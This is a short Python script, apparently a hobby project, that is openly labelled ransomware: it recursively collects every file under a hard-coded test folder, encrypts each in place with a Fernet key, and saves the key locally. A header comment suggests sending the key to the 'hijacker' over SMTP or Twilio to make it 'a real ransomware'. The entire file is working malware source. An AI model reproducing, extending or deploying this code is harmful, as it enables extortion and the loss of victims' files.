# 041222
# to make it a real ransomware, services like smtp or twilio can be used to send the key to the hijacker

import os
from cryptography.fernet import Fernet

whitelist = ['ransomware.py', 'decryption-key.key']
root = 'C:/Users/jings/Desktop/p-projs/malicious/ransomware/test'

def getFiles(path):
    files = []
    for item in os.listdir(path):
        if item in whitelist:
            continue
        elif os.path.isfile(path + '/' + item):
            files.append(path + '/' + item)
        elif os.path.isdir(path + '/' + item):
            files += (getFiles(path + '/' + item))
    return files


def main():
    files = getFiles(root)
    key = Fernet.generate_key()

    with open('decryption-key.key', 'wb') as decryptKey:
        decryptKey.write(key)

    for file in files:
        with open(file, 'rb') as f:
            contents = f.read()
            encryptedContents = Fernet(key).encrypt(contents)
        with open(file, 'wb') as f:
            f.write(encryptedContents)

    print('Files encrypted with key', key)


if __name__ == '__main__':
    main()
